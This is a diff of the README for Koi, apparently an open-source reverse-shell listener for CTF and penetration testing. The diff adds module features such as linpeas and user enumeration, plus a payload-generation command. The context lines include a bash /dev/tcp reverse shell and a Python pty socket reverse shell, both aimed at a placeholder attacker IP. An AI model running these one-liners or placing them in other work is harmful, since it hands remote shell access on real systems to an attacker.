@@ -23,9 +23,8 @@ Disclaimer: please note that this is still under development, and I tam still wo
 
 ## 🚧 WIP
 
-* **Payloads**: A single command would allow you to generate generic payload in order to send them
-* **Modules**: The big advantage of using python sockets to control your shells is the automation. I'm working on a module section that would automate inforamtion gathering, uploading of files such as bloodhound collectors
-* **Testings**: I've tried my tool on CTF and personal devices but it still needs more testing, especially on windows based devices (do not hesitate on sending me bug reports)
+* **Modules**: I'm working on a module section that would automate inforamtion gathering, uploading of files such as bloodhound collectors and so on. this part is still under WIP since i'm experimenting ways to make it reliable yet easy to implement for you guys.
+* **Testings**: I've tried my tool on CTF and personal devices but it still needs more testing. As of now, this has been made for linux based shells but I want it to be able to work under windows powershell with all it's implications.
 ---
 
 ## 🚀 Installation
@@ -39,7 +38,7 @@ pipx install .
 # directly from the repo
 pipx install git+https://github.com/b3rt1ng/Koi
 
-# For the lazy ones
+# For the lazy ones (but often not on the latest versions)
 pipx install koi-handler
 ```
 
@@ -69,6 +68,7 @@ bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
 # Python PTY
 python3 -c "import os,pty,socket;s=socket.socket();s.connect(('YOUR_IP',4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('/bin/bash')"
 ```
+But juste type `payloads *interface*` to get pregenerated payloads ;)
 
 ---
 
@@ -82,15 +82,10 @@ Once `koi` is running, you are presented with a control terminal:
 | `go <id>` | Enter a session interactively |
 | `upgrade <id>` | Upgrade session to a full PTY |
 | `kill <id>` | Terminate and remove a session |
+| `modules` | List all modules |
+| `run <module_name> <id> [args_if_needed]` | Run a module on a terget |
 | `help` | Show available commands |
 | `exit` | Shut down the listener |
-
-### Session signals
-
-| Key | Action |
-|---|---|
-| `Ctrl+Z` | Background session → return to listener shell |
-| `Ctrl+C` | Send `SIGINT` to the remote (keeps session alive) |
 
 ---
 
@@ -109,5 +104,12 @@ Under the hood it runs:
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
-with `TERM=xterm-256color` and history suppressed.
-(and some resizing info)
+with `TERM=xterm-256color` and some resizing info
+
+### 🤖 Modules
+
+Modules are basically a way to automate actions on your instances. you can run commands, and take advantage of your python backend.
+
+Checkout the [blueprint](src/koi/modules/blueprint.py) to see how you can make your own module or check our examples ([linpeas](src/koi/modules/linpeas.py), [get users](src/koi/modules/get_users.py)) to get insiprations
+
+Also, if you want to make your own module part of this repo, do not hesitate to make a PR, I will gladly look at it and see if it's interesting to add here <3
